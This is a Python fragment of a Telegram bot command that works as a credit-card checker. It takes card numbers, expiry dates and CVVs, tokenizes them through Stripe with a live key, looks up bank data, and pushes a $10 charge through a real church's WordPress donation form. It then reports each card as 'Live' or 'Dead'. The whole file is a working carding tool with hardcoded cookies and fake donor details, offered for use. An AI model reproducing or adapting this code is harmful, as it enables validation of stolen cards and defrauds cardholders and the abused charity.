#----------------------------------------------------------------
# Gate -> https://www.churchofgodpacoima.com/donate/
@iniciar.message_handler(commands=['ch'], commands_prefix=comand)
async def helpstr(message: types.Message):
    ini = time.perf_counter()
    ccs = message.text[len('/ch '):]

    if not ccs:
           await message.reply("/ch cc|mm|aa")

    spli = ccs.split('|')
    cc = spli[0]
    mes = spli[1]
    ano = spli[2]
    cvv = spli[3]
    
    session = requests.session()
    s = session.post('https://m.stripe.com/6')
    r = s.json()
    guid = r['guid']
    muid = r['muid']
    sid = r['sid']

    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',}
    
    data = f'time_on_page=1002419&guid={guid}&muid={muid}&sid={sid}&key=pk_live_kkIOioqvMQs4lec76gX9Ap5R&payment_user_agent=stripe.js%2F78ef418&card[name]=manuel&card[number]={cc}&card[exp_month]={mes}&card[exp_year]={ano}&card[cvc]={cvv}'
    response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
    lol = response.json()   

    if 'incorrect_number' in response.text:
        code = lol['error']['code']
        await message.reply(f"""<b>
CC DEAD ❌

cc : <code>{ccs}</code>
Code : {code}
SMG : Your card number is incorrect.</b>
        """)
    else:
        token = response.json()['id']
        tad = response.json()
        card = tad['card']

        apis = requests.get(f"https://bins-su-ani.vercel.app/api/{cc}").json()

        result=apis['result']
        msg=apis['message']
        data=apis['data']
        vendor=data['vendor']
        bn=data['bin']
        typ=data['type']
        lv=data['level']
        bank=data['bank']
        country=data['country']
        countryinfo=data['countryInfo']
        name=countryinfo['name']
        emoji=countryinfo['emoji']
        cd=countryinfo['code']
        dialCode=countryinfo['dialCode']
        
        cookies = {
            '_ga': 'GA1.2.929401543.1672862249',
            '_gid': 'GA1.2.87629019.1672862249',
            '__stripe_mid': '69acdb33-9d90-4d0e-8f28-b349e1dcb39a22f74d',
            'pdb-sess': '389eaaf8b8b508f9de8414a8358a243e',
            '__stripe_sid': 'baf0cce0-c506-43e1-82ec-9f27052f8fda165981',}
            
            
        headers = {
            'authority': 'www.churchofgodpacoima.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'es-ES,es;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': '_ga=GA1.2.929401543.1672862249; _gid=GA1.2.87629019.1672862249; __stripe_mid=69acdb33-9d90-4d0e-8f28-b349e1dcb39a22f74d; pdb-sess=389eaaf8b8b508f9de8414a8358a243e; __stripe_sid=baf0cce0-c506-43e1-82ec-9f27052f8fda165981',
            'origin': 'https://www.churchofgodpacoima.com',
            'referer': 'https://www.churchofgodpacoima.com/donate/',
            'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',}
        data = {
            'action': 'wp_full_stripe_payment_charge',
            'formName': 'Donation',
            'fullstripe_name': 'manuel',
            'fullstripe_email': 'rexwairtwwkwk@gmail.com',
            'fullstripe_custom_input': 'thanks',
            'fullstripe_custom_amount': '10.00',
            'fullstripe_address_line1': 'stree  457',
            'fullstripe_address_line2': '',
            'fullstripe_address_city': 'NY',
            'fullstripe_address_state': 'Cesar',
            'fullstripe_address_zip': '100100',
            'stripeToken': [
                token,
                ],}
            
        response1 = requests.post('https://www.churchofgodpacoima.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data).json()
        
        msg = response1['msg']

        #await message.reply(msg)

        if 'Your card was declined.' in msg:
            await message.reply(f"""<b>
CC Dead ❌

cc : <code>{ccs}</code>
Status : Decline
msg : Your card was declined.
‗‗‗‗‗‗‗‗‗‗‗‗‗‗
Bin: {bn}
Data: {vendor} {typ} {lv}
BANK: {bank}
COUNTRY : {country} {name} {emoji} {cd}</b>
""")
        else:
            await message.reply(f"""<b>
CC Live ✅

cc : <code>{ccs}</code>
SMG : Aproved
‗‗‗‗‗‗‗‗‗‗‗‗‗‗
Bin: {bn}
Data: {vendor} {typ} {lv}
BANK: {bank}
COUNTRY : {country} {name} {emoji} {cd}

</b>""")